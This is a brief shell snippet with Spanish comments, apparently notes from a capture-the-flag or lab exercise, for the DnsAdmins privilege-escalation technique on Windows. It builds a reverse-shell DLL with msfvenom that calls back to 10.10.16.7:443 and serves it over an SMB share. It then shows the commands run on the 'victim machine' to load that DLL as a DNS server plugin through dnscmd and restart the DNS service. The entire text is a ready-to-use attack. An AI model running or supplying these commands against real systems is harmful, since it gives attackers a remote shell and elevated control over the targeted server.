
```shell
#LOCAL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=443 -f dll -o pwned.dll
sudo impacket-smbserver smbFolder $(pwd) -smb2support

#EN LA MÁQUINA VICTIMA
#ESTOS 3 COMANDOS HAY QUE HACERLOS VARIAS VECES YA QUE LE CUESTA BASTANTE
dnscmd.exe /config /serverlevelplugindll \\10.10.16.7\smbFolder\pwned.dll
sc.exe stop dns
sc.exe start dns
```